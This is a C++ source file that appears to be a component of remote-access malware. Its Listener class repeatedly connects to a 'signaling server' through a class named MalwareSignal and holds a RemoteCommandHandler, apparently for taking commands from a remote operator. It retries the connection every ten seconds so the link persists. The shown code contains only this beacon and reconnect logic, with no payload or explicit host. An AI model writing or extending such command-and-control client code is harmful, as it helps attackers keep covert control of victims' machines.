//
// Created by darkglitch on 9/17/26.
//
#include "../../include/controller/Listener.h"
#include "../../include/model/MalwareSignal.h"
#include "../../include/model/RemoteCommandHandler.h"
#include <chrono>
#include <iostream>
#include <thread>

using namespace std;

Listener::Listener(shared_ptr<MalwareSignal> signal, shared_ptr<RemoteCommandHandler> handler):
    signal_(std::move(signal)),
    handler_(std::move(handler)){}

void Listener::run() {
    constexpr int retryDelaySeconds = 10;

    while (running_) {
        try {
            if (!signal_->connect()) {
                throw std::runtime_error(
                    "failed to connect to signaling server"
                );
            }

            cout << "[+] Connected to signaling server\n";

            signal_->listen();

            cout << "[!] Signaling connection ended\n";
        }
        catch (const std::exception& e) {
            cerr << "[!] Connection lost: " << e.what() << '\n';
        }

        signal_->close();

        if (!running_) {
            break;
        }

        cout << "[!] Reconnecting in " << retryDelaySeconds << " seconds\n";

        this_thread::sleep_for(chrono::seconds(retryDelaySeconds));
    }
}

void Listener::stop() {
    running_ = false;

    if (signal_) {
        signal_->close();
    }
}